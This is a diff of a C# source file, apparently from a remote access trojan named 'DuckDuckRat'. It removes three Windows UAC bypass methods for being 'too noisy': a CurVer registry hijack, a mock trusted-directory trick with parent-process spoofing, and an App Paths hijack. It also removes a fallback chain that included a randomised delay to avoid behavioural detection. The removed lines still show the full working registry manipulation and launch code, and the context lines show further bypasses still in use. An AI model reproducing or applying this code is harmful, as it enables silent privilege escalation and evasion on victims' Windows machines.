@@ -197,27 +197,13 @@ namespace DuckDuckRat
             } catch { return false; }
         }
 
+        /* 
+        [GHOST] Method R: CurVer Hijack via {trigger} (REMOVED - TOO NOISY)
         private static bool BypassCurVer(string payloadPath, string args, string evName, string trigger = "ComputerDefaults.exe")
         {
-            string randKey = Guid.NewGuid().ToString("N").Substring(0, 8);
-            string classKey = $@"Software\Classes\{randKey}";
-            try {
-                Log($"Method R: CurVer Hijack via {trigger} ({randKey})...");
-                using (var k = Registry.CurrentUser.CreateSubKey($@"{classKey}\shell\open\command")) {
-                    k.SetValue("", $"\"{payloadPath}\" {args}");
-                    k.SetValue("DelegateExecute", "");
-                }
-                using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\CurVer")) {
-                    k.SetValue("", randKey);
-                }
-                Process.Start(new ProcessStartInfo { FileName = trigger, UseShellExecute = true, CreateNoWindow = true });
-                return WaitForAdminSuccess(10000, evName);
-            } catch { return false; }
-            finally {
-                try { Registry.CurrentUser.DeleteSubKeyTree(classKey, false); } catch { }
-                try { Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings", true)?.DeleteSubKey("CurVer", false); } catch { }
-            }
+            ...
         }
+        */
 
         private static unsafe bool BypassColorDataProxy(string payloadPath, string args, string evName)
         {
@@ -259,41 +245,21 @@ namespace DuckDuckRat
             } catch { return false; }
         }
 
+        /* 
+        [GHOST] Method M: Mock Directory (REMOVED - TOO NOISY)
         public static bool BypassMockDir(string payloadPath, string args, string evName, string triggerName = "ComputerDefaults.exe")
         {
-            string mockWindows = @"\\?\C:\Windows ";
-            string mockSystem32 = Path.Combine(mockWindows, "System32");
-            try {
-                Log($"Method M: Mock Directory ({triggerName})...");
-                if (!Native.CreateDirectoryW(mockWindows, IntPtr.Zero) && Marshal.GetLastWin32Error() != 183) return false;
-                if (!Native.CreateDirectoryW(mockSystem32, IntPtr.Zero) && Marshal.GetLastWin32Error() != 183) return false;
-                string targetPath = Path.Combine(mockSystem32, triggerName);
-                if (!File.Exists(targetPath)) File.Copy(Path.Combine(Environment.SystemDirectory, triggerName), targetPath);
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command")) {
-                    key.SetValue("", $"\"{payloadPath}\" {args}");
-                    key.SetValue("DelegateExecute", "", RegistryValueKind.String);
-                }
-                if (SpawnWithSpoof(targetPath, "", "taskhostw")) return WaitForAdminSuccess(10000, evName);
-                return false;
-            } catch { return false; }
-            finally { try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false); } catch { } }
+            ...
         }
+        */
 
+        /* 
+        [GHOST] Method U: AppPaths Hijack (REMOVED - TOO NOISY)
         private static bool BypassAppPaths(string payloadPath, string args, string evName, string target = "control.exe")
         {
-            try {
-                Log($"Method U: AppPaths Hijack ({target})...");
-                string keyPath = $@"Software\Microsoft\Windows\CurrentVersion\App Paths\{target}";
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath)) {
-                    key.SetValue("", payloadPath);
-                    key.SetValue("Path", Path.GetDirectoryName(payloadPath));
-                }
-                Process.Start(new ProcessStartInfo { FileName = target, Arguments = args, UseShellExecute = true, CreateNoWindow = true });
-                bool ok = WaitForAdminSuccess(12000, evName);
-                try { Registry.CurrentUser.DeleteSubKeyTree(keyPath, false); } catch { }
-                return ok;
-            } catch { return false; }
+            ...
         }
+        */
 
         #endregion
 
@@ -350,20 +316,6 @@ namespace DuckDuckRat
             if (BypassCmluaUtil(payloadPath, args, evName)) return true;
             if (BypassFwCplLua(payloadPath, args)) return true;
             if (BypassColorDataProxy(payloadPath, args, evName)) return true;
-            
-            // Wait slightly before fallback to avoid behavioral linkage
-            Thread.Sleep(new Random().Next(2000, 4000));
-
-            // Re-enabled MockDir (Fodhelper trigger)
-            if (BypassMockDir(payloadPath, args, evName, "fodhelper.exe")) return true;
-            
-            // Re-enabled CurVer (ComputerDefaults trigger)
-            if (BypassCurVer(payloadPath, args, evName, "ComputerDefaults.exe")) return true;
-            
-            if (BypassAppPaths(payloadPath, args, evName, "control.exe")) return true;
-            
-            // Final desperate fallback: MockDir (ComputerDefaults)
-            if (BypassMockDir(payloadPath, args, evName, "ComputerDefaults.exe")) return true;
             
             return false;
         }
